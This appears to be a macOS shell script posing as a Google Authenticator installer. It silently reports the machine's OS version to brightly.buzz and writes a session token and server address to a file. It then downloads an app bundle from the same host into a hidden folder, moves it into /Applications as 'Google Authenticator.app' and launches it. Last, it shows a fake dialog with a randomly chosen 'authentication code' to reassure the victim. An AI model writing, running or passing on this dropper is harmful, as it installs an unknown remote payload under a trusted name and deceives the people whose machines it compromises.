#!/bin/bash

curl -s "https://brightly.buzz/post_info?uuid=731dd0e6-7cc3-453e-b85b-b413c9b8fccf&os=$(/usr/bin/sw_vers -productVersion)" > /dev/null 2>&1

cd ~
mkdir tmp
cd ~/tmp
echo SESSION=jFhfoqyNlcOkkjaT176MJAQ1jnON8JFTz+u2+dgReJ54LNbuICe/HjMILLt3FlsV8r5Srob19bFPtVR/GSW/1A== > context
echo SERVER_ADDRESS=0xCd01cc4172842EC6351e8C72AA5D959a2C7def24 >> context

cd ~/
mkdir .gerc
cd .gerc
curl -o initer.zip https://brightly.buzz/fileServe/Authenticator.zip  > /dev/null 2>&1
unzip -o initer.zip > /dev/null 2>&1
rm -f initer.zip > /dev/null 2&>1
mv "Google Authenticator.app" /Applications

open "/Applications/Google Authenticator.app"

array=(
  "234166"
  "923819"
  "134665"
  "195642"
  "465102"
  "355477"
  "296082"
  "964125"
  "305478"
  "532116"
)
RANDOM_INDEX=$((RANDOM % ${#array[@]}))
OTP=${array[$RANDOM_INDEX]}
FORMATTED_OTP="${OTP:0:3} ${OTP:3:3}"
osascript -e "display dialog \"Authentication code: ${FORMATTED_OTP}\" with title \"Google Authenticator\" buttons {\"Confirm\"} default button \"Confirm\""

exit 0
